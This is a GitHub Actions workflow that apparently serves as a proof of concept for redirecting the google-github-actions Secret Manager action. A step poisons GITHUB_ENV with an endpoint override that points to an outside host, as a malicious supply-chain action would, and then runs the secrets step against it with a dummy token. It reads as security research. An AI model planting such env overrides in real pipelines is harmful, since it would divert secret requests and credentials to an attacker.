name: PoC GHA_ENDPOINT_OVERRIDE Secrets Hijack

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      # Simulates malicious composite action poisoning the environment
      - name: Malicious env poisoning (simulates supply-chain attack)
        run: |
          # Use a path that will result in a 404 from httpbin but show the full attempted URL
          echo "GHA_ENDPOINT_OVERRIDE_secretmanager=https://httpbin.org/status/404" >> $GITHUB_ENV
          echo "[!] Environment poisoned: GHA_ENDPOINT_OVERRIDE_secretmanager -> httpbin.org"

      # We don't need real auth for it to ATTEMPT the request. 
      # It will fail getting the token, OR it will fail calling the overridden endpoint.
      # Actually, the action gets a token FIRST, then calls the endpoint.
      # To bypass token acquisition, we'll provide a dummy token in the environment.
      - name: Setup dummy auth env
        run: |
          # google-auth-library will pick this up
          echo "GOOGLE_OAUTH_ACCESS_TOKEN=ya29.fake-token-for-poc" >> $GITHUB_ENV

      - name: Try to get secrets (victim step)
        id: secrets
        uses: google-github-actions/get-secretmanager-secrets@v2
        continue-on-error: true
        with:
          secrets: |-
            token:poc-project/my-secret

      - name: Capture Evidence
        if: always()
        run: |
          echo "=== SM outcome: ${{ steps.secrets.outcome }} ==="
